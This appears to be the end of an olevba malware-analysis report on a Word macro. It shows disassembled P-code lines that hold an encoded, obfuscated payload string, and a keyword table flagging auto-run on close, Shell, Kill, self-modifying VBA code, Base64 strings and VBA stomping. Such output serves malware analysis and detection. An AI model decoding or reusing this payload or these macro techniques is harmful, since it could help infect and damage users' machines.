' 	QuoteRem 0x0000 0x0028 "(#!#!#!#/%%&/#*%/'$(&'#(%(-'*'/'&'$(!#"$"
' Line #443:
' 	QuoteRem 0x0000 0x0028 "-#!#"%%%/#-'*'/'&'$()#"$-#!#"%%%/#$'0'&("
' Line #444:
' 	QuoteRem 0x0000 0x0028 "/'%(0'''-'*'/'&'$(*#.!+!(#!#&%/'%'!#*%''"
' Line #445:
' 	QuoteRem 0x0000 0x0028 ".!+!(#!#*%''!#"%%%/#-'*'/'&'$()#"$-#!#"$"
' Line #446:
' 	QuoteRem 0x0000 0x0028 "*#!#-$/$!###(#-$)'%(.'-'/$!#-$$%*(#'&'#("
' Line #447:
' 	QuoteRem 0x0000 0x0028 "$&)'"'%'0'((/$##!#%&)'&'/'.!+!(#!#!#!#"%"
' Line #448:
' 	QuoteRem 0x0000 0x0028 "%%/#%%&'-'&'%(&'-%*'/'&'$(!#"$-#!#"%%%/#"
' Line #449:
' 	QuoteRem 0x0000 0x0028 "$'0'&(/'%(0'''-'*'/'&'$(.!+!(#!#!#!#"%%%"
' Line #450:
' 	QuoteRem 0x0000 0x0028 "/#*%/'$(&'#(%(-'*'/'&'$(!#"$-#!#/%%&/#-'"
' Line #451:
' 	QuoteRem 0x0000 0x0028 "*'/'&'$()#"$-#!#/%%&/#$'0'&(/'%(0'''-'*'"
' Line #452:
' 	QuoteRem 0x0000 0x0028 "/'&'$(*#.!+!(#!#&%/'%'!#*%''.!+!(#!#*'!#"
' Line #453:
' 	QuoteRem 0x0000 0x0028 ".$!#"$+$!#$'!#.$!#"%%%/#$'0'&(/'%(0'''-'"
' Line #454:
' 	QuoteRem 0x0000 0x0028 "*'/'&'.!+!(#!#%%0'!#(&)'*'-'&'!#*'!#-$.$"
' Line #455:
' 	QuoteRem 0x0000 0x0028 "!#$'.!+!(#!#!#*%''!#"%%%/#-'*'/'&'$()#*'"
' Line #456:
' 	QuoteRem 0x0000 0x0028 "-#"$*#.$##-$0#)%%&.%-%##,###/$##!#%()'&'"
' Line #457:
' 	QuoteRem 0x0000 0x0028 "/'.!+!(#!#!#!#"%%%/#%%&'-'&'%(&'-%*'/'&'"
' Line #458:
' 	QuoteRem 0x0000 0x0028 "$(!#*',#"$-#"%%%/#$'0'&(/'%(0'''-'*'/'&'"
' Line #459:
' 	QuoteRem 0x0000 0x0028 "$(.#*'.#"$.!+!(#!#!#!#*'!#.$!#$'.!+!(#!#"
' Line #460:
' 	QuoteRem 0x0000 0x0028 "!#&%/'%'!#*%''.!+!(#!#!#*'!#.$!#*'!#,#!#"
' Line #461:
' 	QuoteRem 0x0000 0x0028 ""$.!+!(#!#-%0'0'!(.!+!(#!#*'!#.$!#"$+$!#"
' Line #462:
' 	QuoteRem 0x0000 0x0028 "$'!#.$!#/%%&/#$'0'&(/'%(0'''-'*'/'&'$(.!"
' Line #463:
' 	QuoteRem 0x0000 0x0028 "+!(#!#%%0'!#(&)'*'-'&'!#*'!#-$.$!#$'.!+!"
' Line #464:
' 	QuoteRem 0x0000 0x0028 "(#!#!#*%''!#/%%&/#-'*'/'&'$()#*'-#"$*#.$"
' Line #465:
' 	QuoteRem 0x0000 0x0028 "##-$0#)%%&.%-%##,###/$##!#%()'&'/'.!+!(#"
' Line #466:
' 	QuoteRem 0x0000 0x0028 "!#!#!#/%%&/#%%&'-'&'%(&'-%*'/'&'$(!#*',#"
' Line #467:
' 	QuoteRem 0x0000 0x0028 ""$-#/%%&/#$'0'&(/'%(0'''-'*'/'&'$(.#*'.#"
' Line #468:
' 	QuoteRem 0x0000 0x0028 ""$.!+!(#!#!#!#*'!#.$!#$'.!+!(#!#!#&%/'%'"
' Line #469:
' 	QuoteRem 0x0000 0x0028 "!#*%''.!+!(#!#!#*'!#.$!#*'!#,#!#"$.!+!(#"
' Line #470:
' 	QuoteRem 0x0000 0x0028 "!#-%0'0'!(.!+!(#&%/'%'!#$&&(#'.!+!(#!&#("
' Line #471:
' 	QuoteRem 0x0000 0x0028 "*''("'%(&'!#$&&(#'!#(&#(*'%(&'%%&(.'!()#"
' Line #472:
' 	QuoteRem 0x0000 0x0028 "%'#(0'!(!(&'#(!&"'%()'*#.!+!(#!#0%/'!#&%"
' Line #473:
' 	QuoteRem 0x0000 0x0028 "#(#(0'#(!##&&'$(&(.'&'!#/%&')(%(.!+!(#!#"
' Line #474:
' 	QuoteRem 0x0000 0x0028 "$&&'%(!#"%%%!#.$!#"%$'%(*''(&'%%0'$'&(.'"
' Line #475:
' 	QuoteRem 0x0000 0x0028 "&'/'%(/#'&#%!&#(0'+'&'$'%(/#'&#%$%0'.'!("
' Line #476:
' 	QuoteRem 0x0000 0x0028 "0'/'&'/'%($()#"$*#/#$%0'%'&'.%0'%'&(-'&'"
' Line #477:
' 	QuoteRem 0x0000 0x0028 ".!+!(#!#$')'&'$','*'%(!#.$!###%%&(.'!(*'"
' Line #478:
' 	QuoteRem 0x0000 0x0028 "/'##.!+!(#!#*'!#.$!#"$+$!#(%&'%(%%&(.'!("
' Line #479:
' 	QuoteRem 0x0000 0x0028 "!#.$!#!$.!+!(#!#%%0'!#(&)'*'-'&'!#*'!#-$"
' Line #480:
' 	QuoteRem 0x0000 0x0028 "!#"%%%/#$'0'&(/'%(0'''-'*'/'&'$(.!+!(#!#"
' Line #481:
' 	QuoteRem 0x0000 0x0028 "!#"'!#.$!#"%%%/#-'*'/'&'$()#*'-#!#"$*#.!"
' Line #482:
' 	QuoteRem 0x0000 0x0028 "+!(#!#!#*%''!#-%&'/')#"'*#!#/$!#-%&'/')#"
' Line #483:
' 	QuoteRem 0x0000 0x0028 "$')'&'$','*'%(*#!#%&)'&'/'.!+!(#!#!#!#'%"
' Line #484:
' 	QuoteRem 0x0000 0x0028 "0'#(!#+'!#.$!#"$!#%&0'!#-%&'/')#"'*#!#.#"
' Line #485:
' 	QuoteRem 0x0000 0x0028 "!#-%&'/')#$')'&'$','*'%(*#.!+!(#!#!#!#!#"
' Line #486:
' 	QuoteRem 0x0000 0x0028 "*%''!#.%*'%'%#)#"'-#!#+'-#!#-%&'/')#$')'"
' Line #487:
' 	QuoteRem 0x0000 0x0028 "&'$','*'%(*#!#,#!#"$*#!#.$!#$')'&'$','*'"
' Line #488:
' 	QuoteRem 0x0000 0x0028 "%(!#,#!###('##!#%&)'&'/'!#(%&'%(%%&(.'!("
' Line #489:
' 	QuoteRem 0x0000 0x0028 "!#.$!#*'!#,#!#"$+$!#*'!#.$!#"%%%/#$'0'&("
' Line #490:
' 	QuoteRem 0x0000 0x0028 "/'%(0'''-'*'/'&'$(.!+!(#!#!#!#/%&')(%(.!"
' Line #491:
' 	QuoteRem 0x0000 0x0028 "+!(#!#!#&%/'%'!#*%''.!+!(#!#!#*'!#.$!#*'"
' Line #492:
' 	QuoteRem 0x0000 0x0028 "!#,#!#"$.!+!(#!#-%0'0'!(.!+!(#!#%'#(0'!("
' Line #493:
' 	QuoteRem 0x0000 0x0028 "!(&'#(#%0'%'*(!#.$!#####.!+!(#!#%%0'!#(&"
' Line #494:
' 	QuoteRem 0x0000 0x0028 ")'*'-'&'!#.%*'%'%#)#"%%%/#-'*'/'&'$()#(%"
' Line #495:
' 	QuoteRem 0x0000 0x0028 "&'%(%%&(.'!(-#!#"$*#-#!#"$-#!#"$*#!#.$!#"
' Line #496:
' 	QuoteRem 0x0000 0x0028 "##(###.!+!(#!#!#*%''!#-%&'/')#"%%%/#-'*'"
' Line #497:
' 	QuoteRem 0x0000 0x0028 "/'&'$()#(%&'%(%%&(.'!(-#!#"$*#*#!#/$!##$"
' Line #498:
' 	QuoteRem 0x0000 0x0028 "!#%&)'&'/'.!+!(#!#!#!#'%0'#(!#*'!#.$!##$"
' Line #499:
' 	QuoteRem 0x0000 0x0028 "!#%&0'!#-%&'/')#"%%%/#-'*'/'&'$()#(%&'%("
' Line #500:
' 	QuoteRem 0x0000 0x0028 "%%&(.'!(-#!#"$*#*#!#$&%(&'!(!##$.!+!(#!#"
' Line #501:
' 	QuoteRem 0x0000 0x0028 "!#!#!#*%''!#.%*'%'%#)#"%%%/#-'*'/'&'$()#"
' Line #502:
' 	QuoteRem 0x0000 0x0028 "(%&'%(%%&(.'!(-#!#"$*#-#!#*'-#!#"$*#!#-$"
' Line #503:
' 	QuoteRem 0x0000 0x0028 "/$!###!###!#%&)'&'/'.!+!(#!#!#!#!#!#"'"$"
' Line #504:
' 	QuoteRem 0x0000 0x0028 "!#.$!#"%$($')#.%*'%'%#)#"%%%/#-'*'/'&'$("
' Line #505:
' 	QuoteRem 0x0000 0x0028 ")#(%&'%(%%&(.'!(-#!#"$*#-#!#*'-#!#"$*#*#"
' Line #506:
' 	QuoteRem 0x0000 0x0028 "!#.#!#$$$$.!+!(#!#!#!#!#!##'"$!#.$!#"%$("
' Line #507:
' 	QuoteRem 0x0000 0x0028 "$')#.%*'%'%#)#"%%%/#-'*'/'&'$()#(%&'%(%%"
' Line #508:
' 	QuoteRem 0x0000 0x0028 "&(.'!(-#!#"$*#-#!#*'!#,#!#"$-#!#"$*#*#!#"
' Line #509:
' 	QuoteRem 0x0000 0x0028 ".#!#$$$$.!+!(#!#!#!#!#!#%'#(0'!(!(&'#(#%"
' Line #510:
' 	QuoteRem 0x0000 0x0028 "0'%'*(!#.$!#%'#(0'!(!(&'#(#%0'%'*(!#,#!#"
' Line #511:
' 	QuoteRem 0x0000 0x0028 "$%)'#(%#)#"'"$!#,#!#"$'$!#+#!##'"$*#.!+!"
' Line #512:
' 	QuoteRem 0x0000 0x0028 "(#!#!#!#!#&%/'%'!#*%''.!+!(#!#!#!#/%&')("
' Line #513:
' 	QuoteRem 0x0000 0x0028 "%(.!+!(#!#!#&%/'%'!#*%''.!+!(#!#!#(%&'%("
' Line #514:
' 	QuoteRem 0x0000 0x0028 "%%&(.'!(!#.$!#(%&'%(%%&(.'!(!#,#!#"$.!+!"
' Line #515:
' 	QuoteRem 0x0000 0x0028 "(#!#-%0'0'!(.!+!(#!#0%!(&'/'!#%'#(0'!(!("
' Line #516:
' 	QuoteRem 0x0000 0x0028 "&'#(!&"'%()'!#,#!###%()'&'%()'*'/'('/#$'"
' Line #517:
' 	QuoteRem 0x0000 0x0028 "0'.'##!#'%0'#(!#0%&(%(!(&(%(!#"%$(!#$#"$"
' Line #518:
' 	QuoteRem 0x0000 0x0028 ".!+!(#!#!#!&#(*'/'%(!#$#"$-#!#%'#(0'!(!("
' Line #519:
' 	QuoteRem 0x0000 0x0028 "&'#(#%0'%'*(,$.!+!(#!#$%-'0'$(&'!#$#"$.!"
' Line #520:
' 	QuoteRem 0x0000 0x0028 "+!(#&%/'%'!#$&&(#'.!+!(#!&#(*''("'%(&'!#"
' Line #521:
' 	QuoteRem 0x0000 0x0028 "$&&(#'!#%%&(.'!(*'/'(')#*#.!+!(#.!+!(#&%"
' Line #522:
' 	QuoteRem 0x0000 0x0028 "/'%'!#$&&(#'.!+!.#.#/$-$0#$($'#(*'!(%(/$"
' Line #523:
' 	QuoteRem 0x0000 0x0028 ".!+!-$0##%0%%%*&/$.!+!-$0#)%%&.%-%/$.!+!"
' Line #524:
' 	QuoteRem 0x0000 0x0002 " '"
' Line #525:
' 	EndSub 
' Line #526:
' 	Reparse 0x000C "--></script>"
' Line #527:
' 	Reparse 0x0007 "</BODY>"
' Line #528:
' 	Reparse 0x0007 "</HTML>"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

